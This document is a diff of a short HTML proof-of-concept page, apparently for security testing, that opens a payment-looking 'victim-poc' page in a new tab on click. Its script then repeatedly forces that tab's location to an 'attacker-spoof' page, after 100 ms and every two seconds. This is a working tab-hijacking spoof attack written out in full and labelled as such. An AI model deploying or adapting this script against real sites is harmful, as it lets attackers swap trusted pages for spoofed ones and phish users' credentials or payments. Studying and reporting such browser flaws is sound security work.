@@ -1,23 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sandboxed Test</title>
-</head>
-<body>
-<h1>Click to open spoofed tab</h1>
 
-<iframe sandbox="allow-scripts allow-popups allow-same-origin" style="width:0; height:0; border:none;" id="sandbox"></iframe>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<h1>click to open spoofed tab</h1>
 
 <script>
-document.body.onclick = () => {
-    const win = window.open('https://max-pay-nine.vercel.app/victim-poc.html');
-    const spoof = () => {
-        win.location.href = 'https://mrnoob790.github.io/attacker-spoof.html';
-    };
-    setTimeout(spoof, 100);
-    setInterval(spoof, 2000);
-};
+    document.body.onclick = () => {
+
+        const win = window.open('https://max-pay-nine.vercel.app/victim-poc.html');
+
+        const spoof = () => {
+            win.location.href = 'https://mrnoob790.github.io/attacker-spoof.html';
+        };
+
+        setTimeout(spoof, 100);
+
+        setInterval(spoof, 2000);
+    }
 </script>
-</body>
-</html>
